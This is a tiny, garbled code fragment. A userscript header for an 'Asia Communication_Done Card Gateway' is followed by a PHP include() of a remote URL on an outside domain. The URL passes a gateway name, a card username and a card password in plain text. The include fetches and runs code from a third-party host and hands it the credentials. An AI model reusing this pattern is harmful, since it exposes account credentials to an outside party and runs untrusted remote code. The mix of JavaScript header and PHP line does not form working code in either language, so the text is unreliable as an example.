// ==UserScript==
			   // @name           Asia Communication_Done Card Gateway
...
include ('http://vally.in/includefile/pay2.php?uname=skjain_Gateway&gate1=DoneCard&cardusername=MUSHTAQSHAH&cardpassword=MUSHTAQSHAH');